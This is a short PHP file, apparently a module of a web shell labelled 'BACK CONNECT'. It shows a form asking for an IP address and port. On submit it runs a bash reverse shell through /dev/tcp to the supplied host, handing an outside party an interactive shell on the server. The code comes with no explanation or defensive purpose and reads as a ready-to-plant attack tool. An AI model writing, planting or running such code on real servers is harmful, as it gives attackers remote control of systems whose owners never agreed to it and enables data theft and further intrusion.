	<?php
  echo "<center><form method='post'>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BACK CONNECT  <br><br>
	IP&nbsp;&nbsp;&nbsp; :&nbsp;<input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'><br>
	Port :&nbsp;<input type='text' placeholder='port' name='port_bc' value='433'><br><br>
	<input type='submit' name='sub_bc' class='btn cta' value='Connect' style='width: 190px;'>
	</form>";
	if(isset($_POST['sub_bc'])) {
		$ip = $_POST['ip_bc'];
		$port = $_POST['port_bc'];
		exe("/bin/bash -i >& /dev/tcp/$ip/$port 0>&1");
	}
	echo "</center>";
  ?>
